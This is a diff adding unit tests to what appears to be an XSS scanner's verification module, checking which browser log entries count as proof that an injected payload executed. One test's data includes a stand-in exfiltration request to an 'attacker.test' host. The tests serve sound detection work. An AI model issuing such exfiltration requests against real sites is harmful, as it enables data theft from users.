@@ -494,6 +494,19 @@ class BrowserProofTests(unittest.TestCase):
         logs = ["fetch:https://www.google-analytics.com/g/collect?zq123"]
         self.assertFalse(xf_browser._exec_logs(logs, "zq123"))
 
+    def test_sink_input_is_not_execution_proof(self):
+        import xf_browser
+        logs = ["document.write:<option value='zq123'>zq123</option>",
+                "innerHTML:zq123", "title:zq123", "insertAdjacentHTML:zq123",
+                "log:zq123"]
+        self.assertFalse(xf_browser._exec_logs(logs, "zq123"))
+
+    def test_dialog_and_exfil_are_proof(self):
+        import xf_browser
+        self.assertTrue(xf_browser._exec_logs(["confirm:zq123"], "zq123"))
+        self.assertTrue(xf_browser._exec_logs(
+            ["fetch:https://attacker.test/c?zq123"], "zq123"))
+
 
 class SessionTests(unittest.TestCase):
     def test_login_reappeared(self):
